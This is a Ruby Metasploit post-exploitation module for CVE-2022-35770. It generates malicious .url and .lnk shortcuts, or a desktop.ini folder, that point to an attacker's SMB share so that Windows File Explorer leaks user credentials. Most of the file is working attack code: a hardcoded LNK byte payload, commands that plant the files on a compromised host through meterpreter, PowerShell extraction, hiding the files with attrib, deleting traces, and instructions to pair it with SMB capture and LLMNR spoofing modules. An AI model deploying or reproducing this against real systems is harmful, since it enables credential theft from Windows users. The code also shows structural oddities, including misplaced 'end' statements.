require 'zip'
require 'msf/core'
require 'msf/core/post/file'

class MetasploitModule < Msf::Post
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Post::Common
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows File Explorer Information Disclosure Vulnerabilies',
      'Description'    => %q{
        This module exploits a vulnerability in the handling of Windows shortcuts, zipfiles and directories.
        Loading arbitrary icons via non-existant SMB shares or otherwise corruped directories, shortcuts and
        zip contents can lead to disclosure of user session credentials.

        Either create a zip payload containing nessessary shortcut(s), or a directory containing malformed 
        configuration, then drop the payload to a target directory.

        Run 'auxiliary/server/capture/smb' and 'auxiliary/spoof/llmnr/llmnr_response' modules to handle the requests broadcasted from
        these payloads.
      },
      'Author'         =>
        [
          'RGFulw',
        ],
      'References'     =>
        [
          ['CVE', '2022-35770'],
          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-35770'],
          ['URL', 'https://youtu.be/M056EeXlM6Y?si'], # Demo
        ],
      'DisclosureDate' => 'Oct 11 2022',
      'License'        => MSF_LICENSE,
      'Platform'       => [ 'win' ],
      'Arch'           => [ARCH_ANY, ARCH_X86, ARCH_X64],
      'Targets'        =>
       [
         [ 'Windows', { 'Arch' => ARCH_ANY } ],
         [ 'Windows x64', { 'Arch' => ARCH_X64 } ],
         [ 'Windows x86', { 'Arch' => ARCH_X86 } ]
       ],
      'DefaultTarget'  => 1, # 64-bit
      'SessionTypes'   => [ 'meterpreter' ]
    ))

  register_options([
    OptString.new('FILENAME', [ true, 'Name of the generated ZIP', '7807.zip' ]),
    OptString.new('FOLDER', [ false, 'Corrupted foldername', '']),
    OptString.new('LNKNAME', [ false, 'Filename of LNK shortcut', '']),
    OptString.new('URLNAME', [ false, 'Filename of URL shortcut', '']),
    OptString.new('REMOTEDIR', [ true, 'Directory to drop payload on the target machine', '%APPDATA%/../../Desktop']),
    OptString.new('SMBHOST', [ true, 'SMB share referenced by the payloads', 'AAAA/AAA'])
  ])
end

def run
  print_status("Target OS: #{osInfo[:osName]}")
  updateInstalled = updateInstall("KB5018410, KB5018411, KB5018418, KB5018419, KB5018421, KB5018425, KB5018427, KB5018446, KB5018450, KB5018454, KB5018457, KB5018474, KB5018476, KB5018478, KB5018479")

  if updateInstalled
    unless confirm("The October 2022 update is installed on this system. Do you want to continue? (y/n)")
      return
    end
  else
    print_good("The October 2022 update is not installed, system may be vulnerable")
  end

  if datastore['LNKNAME'] && !datastore['LNKNAME'].empty? || datastore['URLNAME'] && !datastore['URLNAME'].empty?
    generateShortcut
    elsif datastore['FOLDER'] && !datastore['FOLDER'].empty?
      generateDirectory
    else
      print_error('You must specify at least one shortcut or folder')
      return
    end  
  end

  def osInfo
    osName = sysinfo['OS']
    { osName: osName}
  rescue
    nil
  end

  def updateInstall(kbId)
    updateKeyPath = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\Packages\\#{kbId}"
    registry_enumkeys(updateKeyPath).any?
  rescue
    false
  end

  def confirm(message)
    print_status(message)
    response = readline.strip.downcase
    response == 'y'
  end

  def generateShortcut
    url = "[InternetShortcut]\r\n"
    url << "URL=file://"
    url << "#{datastore['SMBHOST']}\r\n"
    url << "HotKey=0"

    lnk = [
      0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 
      0x00, 0x00, 0x00, 0x00, 0x46, 0x9B, 0x00, 0x08, 0x00, 0x16, 0x00, 0x00, 0x00, 0x27, 0xEC, 
      0x1D, 0x82, 0x02, 0x5A, 0xD7, 0x01, 0xAA, 0xF6, 0xBA, 0xC6, 0xEC, 0xDA, 0xDA, 0x01, 0x11, 
      0xBB, 0xDF, 0xC8, 0x87, 0xD4, 0xDA, 0x01, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0x00, 0x2F, 0x00, 0x14, 0x00, 0x1F, 0x50, 0xE0, 0x4F, 0xD0, 0x20, 0xEA, 0x3A, 0x69, 0x10, 
      0xA2, 0xD8, 0x08, 0x00, 0x2B, 0x30, 0x30, 0x9D, 0x19, 0x00, 0x2F, 0x43, 0x3A, 0x5C, 0x00, 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x01, 0x00, 
      0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x2D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 
      0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x56, 0x81, 0xFD, 0x04, 
      0x10, 0x00, 0x00, 0x00, 0x00, 0x43, 0x3A, 0x5C, 0x00, 0x00, 0x0E, 0x00, 0x2E, 0x00, 0x2E, 
      0x00, 0x5C, 0x00, 0x2E, 0x00, 0x2E, 0x00, 0x5C, 0x00, 0x2E, 0x00, 0x2E, 0x00, 0x5C, 0x00, 
      0x2E, 0x00, 0x2E, 0x00, 0x5C, 0x00, 0x2E, 0x00, 0x2E, 0x00, 0x14, 0x00, 0x5C, 0x00, 0x5C, 
      0x00, 0x31, 0x00, 0x39, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x36, 0x00, 0x38, 0x00, 
      0x2E, 0x00, 0x31, 0x00, 0x32, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x37, 0x00, 0x30, 0x00, 0x5C, 
      0x00, 0x61, 0x00, 0x61, 0x00, 0x61, 0x00, 0x60, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0xA0, 
      0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x7A, 0x65, 0x78, 0x62, 0x61, 0x6F, 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB2, 0x2D, 0x49, 0xF2, 0x16, 0xC7, 
      0xE2, 0x4F, 0xB3, 0x8F, 0x25, 0xC2, 0x02, 0x00, 0x84, 0x75, 0x4D, 0x76, 0x60, 0x1C, 0xD0, 
      0x46, 0xEF, 0x11, 0x9A, 0xFA, 0xF7, 0x8F, 0x6B, 0x99, 0x0E, 0x3B, 0xB2, 0x2D, 0x49, 0xF2, 
      0x16, 0xC7, 0xE2, 0x4F, 0xB3, 0x8F, 0x25, 0xC2, 0x02, 0x00, 0x84, 0x75, 0x4D, 0x76, 0x60, 
      0x1C, 0xD0, 0x46, 0xEF, 0x11, 0x9A, 0xFA, 0xF7, 0x8F, 0x6B, 0x99, 0x0E, 0x3B, 0x5C, 0x02, 
      0x00, 0x00, 0x09, 0x00, 0x00, 0xA0, 0x61, 0x00, 0x00, 0x00, 0x31, 0x53, 0x50, 0x53, 0xED, 
      0x30, 0xBD, 0xDA, 0x43, 0x00, 0x89, 0x47, 0xA7, 0xF8, 0xD0, 0x13, 0xA4, 0x73, 0x66, 0x22, 
      0x45, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00, 0x00, 0x1F, 0x00, 0x00, 0x00, 0x1A, 0x00, 
      0x00, 0x00, 0x44, 0x00, 0x6F, 0x00, 0x63, 0x00, 0x75, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x6E, 
      0x00, 0x74, 0x00, 0x73, 0x00, 0x20, 0x00, 0x28, 0x00, 0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00, 
      0x55, 0x00, 0x73, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x5C, 0x00, 0x5A, 0x00, 0x47, 
      0x00, 0x46, 0x00, 0x75, 0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x89, 0x00, 
      0x00, 0x00, 0x31, 0x53, 0x50, 0x53, 0xE2, 0x8A, 0x58, 0x46, 0xBC, 0x4C, 0x38, 0x43, 0xBB, 
      0xFC, 0x13, 0x93, 0x26, 0x98, 0x6D, 0xCE, 0x6D, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 
      0x00, 0x1F, 0x00, 0x00, 0x00, 0x2E, 0x00, 0x00, 0x00, 0x53, 0x00, 0x2D, 0x00, 0x31, 0x00, 
      0x2D, 0x00, 0x35, 0x00, 0x2D, 0x00, 0x32, 0x00, 0x31, 0x00, 0x2D, 0x00, 0x31, 0x00, 0x36, 
      0x00, 0x39, 0x00, 0x32, 0x00, 0x34, 0x00, 0x38, 0x00, 0x32, 0x00, 0x32, 0x00, 0x32, 0x00, 
      0x2D, 0x00, 0x32, 0x00, 0x37, 0x00, 0x31, 0x00, 0x37, 0x00, 0x34, 0x00, 0x33, 0x00, 0x37, 
      0x00, 0x32, 0x00, 0x39, 0x00, 0x36, 0x00, 0x2D, 0x00, 0x33, 0x00, 0x37, 0x00, 0x34, 0x00, 
      0x35, 0x00, 0x39, 0x00, 0x31, 0x00, 0x38, 0x00, 0x32, 0x00, 0x34, 0x00, 0x32, 0x00, 0x2D, 
      0x00, 0x31, 0x00, 0x30, 0x00, 0x30, 0x00, 0x31, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0xA8, 0x00, 0x00, 0x00, 0x31, 0x53, 0x50, 0x53, 0x30, 0xF1, 0x25, 0xB7, 0xEF, 0x47, 0x1A, 
      0x10, 0xA5, 0xF1, 0x02, 0x60, 0x8C, 0x9E, 0xEB, 0xAC, 0x39, 0x00, 0x00, 0x00, 0x0A, 0x00, 
      0x00, 0x00, 0x00, 0x1F, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x76, 0x00, 0x6F, 0x00, 
      0x6C, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x74, 0x00, 0x79, 
      0x00, 0x33, 0x00, 0x2D, 0x00, 0x64, 0x00, 0x65, 0x00, 0x76, 0x00, 0x65, 0x00, 0x6C, 0x00, 
      0x6F, 0x00, 0x70, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 
      0x40, 0x00, 0x00, 0x00, 0x00, 0x82, 0x1F, 0xA0, 0x5B, 0xC3, 0xD9, 0x01, 0x29, 0x00, 0x00, 
      0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x1F, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x46, 
      0x00, 0x69, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x20, 0x00, 0x66, 0x00, 0x6F, 0x00, 0x6C, 0x00, 
      0x64, 0x00, 0x65, 0x00, 0x72, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 
      0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x4D, 0x72, 0x8B, 0x9F, 0x5B, 0xC3, 0xD9, 0x01, 0x00, 
      0x00, 0x00, 0x00, 0x85, 0x00, 0x00, 0x00, 0x31, 0x53, 0x50, 0x53, 0xA6, 0x6A, 0x63, 0x28, 
      0x3D, 0x95, 0xD2, 0x11, 0xB5, 0xD6, 0x00, 0xC0, 0x4F, 0xD9, 0x18, 0xD0, 0x69, 0x00, 0x00, 
      0x00, 0x1E, 0x00, 0x00, 0x00, 0x00, 0x1F, 0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x43, 
      0x00, 0x3A, 0x00, 0x5C, 0x00, 0x55, 0x00, 0x73, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 
      0x5C, 0x00, 0x5A, 0x00, 0x47, 0x00, 0x46, 0x00, 0x75, 0x00, 0x5C, 0x00, 0x44, 0x00, 0x6F, 
      0x00, 0x63, 0x00, 0x75, 0x00, 0x6D, 0x00, 0x65, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x73, 0x00, 
      0x5C, 0x00, 0x76, 0x00, 0x6F, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x74, 0x00, 0x69, 0x00, 0x6C, 
      0x00, 0x69, 0x00, 0x74, 0x00, 0x79, 0x00, 0x33, 0x00, 0x2D, 0x00, 0x64, 0x00, 0x65, 0x00, 
      0x76, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x6F, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0x00, 0x39, 0x00, 0x00, 0x00, 0x31, 0x53, 0x50, 0x53, 0xB1, 0x16, 0x6D, 0x44, 0xAD, 0x8D, 
      0x70, 0x48, 0xA7, 0x48, 0x40, 0x2E, 0xA4, 0x3D, 0x78, 0x8C, 0x1D, 0x00, 0x00, 0x00, 0x68, 
      0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x96, 0xAC, 0xBB, 0xC4, 0x5F, 0xA8, 0xE8, 
      0x49, 0xB4, 0xDE, 0xFB, 0xD5, 0x3A, 0x58, 0x8E, 0xA3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ].pack('C*')

    zipPath = "#{Dir.tmpdir}/#{datastore['FILENAME']}"
    Zip::File.open(zipPath, Zip::File::CREATE) do |zipfile|
      zipfile.get_output_stream(datastore['URLNAME']) { |f| f.write(url) }
      zipfile.get_output_stream(datastore['LNKNAME']) { |f| f.write(lnk) }
      zipfile.comment = [0xdeadcafe].pack('V')
    end

    zip = File.read(zipPath)
    directory = datastore['REMOTEDIR']
    targetZipPath = "#{directory}\\#{datastore['FILENAME']}"
    write_file(targetZipPath, zip)
  ensure
    cmd_exec("powershell -c expand-archive -force -Path #{directory}\\#{datastore['FILENAME']} -DestinationPath #{directory}")
    print_good("Payload extracted to #{directory}")
    session.shell_command_token("del \"#{directory}\\#{datastore['FILENAME']}\"")
    system("rm #{Dir.tmpdir}/#{datastore['FILENAME']} ")
  end

  def generateDirectory
    sysfolder = datastore['FOLDER']
    ini = "[.ShellClassInfo]\r\n"
    ini << "IconResource=\\\\"
    ini << "#{datastore['SMBHOST']}\r\n"

    ::FileUtils.mkdir_p("#{Dir.tmpdir}/#{sysfolder}")
    write = ::File.join("#{Dir.tmpdir}/#{sysfolder}", 'desktop.ini')
    file_local_write(write, ini)

    zipPath = "#{Dir.tmpdir}/#{datastore['FILENAME']}"
    Zip::File.open(zipPath, Zip::File::CREATE) do |zipfile|
      Dir[File.join("#{Dir.tmpdir}/#{sysfolder}", '**', '**')].each do |file|
        zipfile.add(file.sub("#{Dir.tmpdir}/", ''), file)
      end
      zipfile.comment = [0xdeadcafe].pack('V')
    end
    zip = File.read(zipPath)
    directory = datastore['REMOTEDIR']
    targetZipPath = "#{directory}\\#{datastore['FILENAME']}"
    write_file(targetZipPath, zip)
  ensure
    cmd_exec("powershell -c expand-archive -force -Path #{directory}\\#{datastore['FILENAME']} -DestinationPath #{directory} ; attrib +s +h #{directory}\\#{datastore['FOLDER']}\\desktop.ini ; attrib +s #{directory}\\#{datastore['FOLDER']}")
    print_good("Payload extracted to #{directory}\\#{datastore['FOLDER']}")
    session.shell_command_token("del \"#{directory}\\#{datastore['FILENAME']}\"")
    system("rm -rf #{Dir.tmpdir}/#{sysfolder} ; rm #{Dir.tmpdir}/#{datastore['FILENAME']}")
  end
end
